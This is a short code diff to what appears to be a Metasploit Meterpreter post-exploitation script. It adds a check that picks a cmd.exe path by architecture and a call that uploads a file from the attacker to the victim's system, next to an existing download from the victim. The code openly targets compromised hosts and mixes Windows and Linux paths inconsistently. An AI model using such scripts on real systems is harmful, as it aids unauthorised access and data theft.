@@ -207,6 +207,18 @@ end
 
 
 #
+# determine target arch
+#
+sysarch = sysinfo['Architecture']
+  if sysarch == ARCH_X86
+    target_compspec = "C:\\Windows\\SysWow64\\cmd.exe"
+  else
+    target_compspec = "C:\\Windows\\system32\\cmd.exe"
+  end
+
+
+
+#
 # determine taget distro
 #
 target_info = cmd_exec('uname -ms')
@@ -357,6 +369,16 @@ end
 # This will download dum.txt from victims system and will save it to attackers root directory
 #
 client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")
+
+
+
+
+#
+# uploads file fto victims system
+# This will upload dum.txt from attacker system and will save it to target root directory
+#
+client.fs.file.upload("%temp%\\dum.txt","/root/dum.txt")
+
 
 
 
